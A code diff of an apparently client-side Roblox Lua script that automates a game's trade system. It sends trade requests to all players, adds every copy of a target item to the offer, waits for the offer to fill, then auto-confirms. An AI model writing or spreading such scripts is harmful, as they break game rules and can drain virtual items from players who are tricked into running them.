@@ -32,22 +32,13 @@ local function sendTradeRequest(playerName)
 end
 
 local function acceptTradeForAll()
-	for _, targetPlayer in ipairs(Players:GetPlayers()) do
-		if targetPlayer ~= Players.LocalPlayer then
-			local args = {
-				targetPlayer,
-				true
-			}
-
-			local success, err = pcall(function()
-				return tradeFunction:InvokeServer(unpack(args))
-			end)
-
-			if success then
-				print("Successfully processed trade request for: " .. targetPlayer.Name)
+	local success, err = pcall(function()
+		for _, targetPlayer in ipairs(Players:GetPlayers()) do
+			if targetPlayer ~= Players.LocalPlayer then
+				tradeFunction:InvokeServer(targetPlayer, true)
 			end
 		end
-	end
+	end)
 end
 
 local function getMultipleUniqueIdsByName(itemName, limit)
@@ -74,6 +65,28 @@ local function getMultipleUniqueIdsByName(itemName, limit)
 	return uniqueIds
 end
 
+-- Helper to check if the trade window currently has items registered in your offer
+local function isTradeOfferPopulated()
+	if not successClientData or not ClientData then
+		return true -- Fallback if ClientData cannot be accessed
+	end
+	
+	local success, tradeData = pcall(function()
+		return ClientData.get("trade")
+	end)
+	
+	if success and tradeData and tradeData.current_trade then
+		local offers = tradeData.current_trade.offers
+		if offers and offers[LocalPlayer] then
+			local myOfferItems = offers[LocalPlayer].items
+			if myOfferItems and #myOfferItems > 0 then
+				return true
+			end
+		end
+	end
+	return false
+end
+
 -- Thread 1: Handles sending and accepting incoming trade sessions
 task.spawn(function()
 	while true do
@@ -93,33 +106,32 @@ task.spawn(function()
 	end
 end)
 
--- Thread 2: Adds items one by one with a wait interval, then confirms
+-- Thread 2: Adds items sequentially, waits for confirmation, then negotiates/confirms
 task.spawn(function()
 	while true do
 		local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, MAX_ITEMS_TO_ADD)
 		
 		if #uniqueIds > 0 then
-			print("Found " .. #uniqueIds .. " items to add. Adding them sequentially...")
-			
-			-- Loop and add items one by one, waiting slightly between each to let the server register it
+			print("Adding items to trade offer...")
 			for _, uniqueId in ipairs(uniqueIds) do
 				pcall(function()
 					addItemRemote:FireServer(uniqueId)
 				end)
-				-- Wait for the individual item to process before adding the next one
-				task.wait(0.25)
+				task.wait(0.15)
 			end
 			
-			-- Final buffer check after all items are added
-			task.wait(0.5)
+			-- Wait actively until the items are confirmed present in the trade window (with a 3-second safety timeout)
+			local startTime = tick()
+			while not isTradeOfferPopulated() and (tick() - startTime) < 3 do
+				task.wait(0.2)
+			end
 			
-			-- Now safely fire negotiation and confirmation
+			-- Now safe to fire negotiation and final confirmation
 			pcall(function()
 				acceptNegotiationRemote:FireServer()
 				confirmTradeRemote:FireServer()
 			end)
-			
-			print("Trade offer populated and confirmed.")
+			print("Trade successfully negotiated and confirmed.")
 		end
 		
 		task.wait(2)
